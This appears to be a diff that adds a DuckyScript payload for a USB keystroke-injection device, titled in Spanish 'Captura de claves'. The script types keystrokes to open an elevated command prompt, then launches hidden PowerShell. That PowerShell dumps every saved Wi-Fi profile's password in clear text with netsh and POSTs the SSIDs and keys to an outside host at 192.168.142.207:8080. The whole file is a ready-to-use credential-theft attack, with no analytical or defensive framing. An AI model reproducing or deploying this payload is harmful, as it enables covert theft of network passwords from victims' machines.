@@ -1,0 +1,17 @@
+REM Captura de claves
+DELAY 500
+GUI r
+DELAY 300
+STRING cmd
+DELAY 300
+CTRL-SHIFT ENTER
+DELAY 2000
+LEFTARROW
+DELAY 300
+ENTER
+DELAY 1000
+STRING cmd /c start powershell -nop -win hid -c "$wlans = netsh wlan show profiles | Select-String -Pattern 'Perfil de todos los usuarios' | Foreach-Object {$_.ToString()}; $exportdata = $wlans | Foreach-Object {$_.Replace('    Perfil de todos los usuarios     : ',$null)}; $headers = New-Object 'System.Collections.Generic.Dictionary[[String],[String]]'; $headers.Add('Content-Type', 'application/json'); $body = $exportdata | ForEach-Object {netsh wlan show profiles name=\"$_\" key=clear} | Select-String -pattern '(Nombre de SSID)|(Contenido de la clave)'; $response = Invoke-RestMethod '192.168.142.207:8080' -Method 'POST' -Headers $headers -Body $body"
+ENTER
+DELAY 5000
+STRING exit
+ENTER
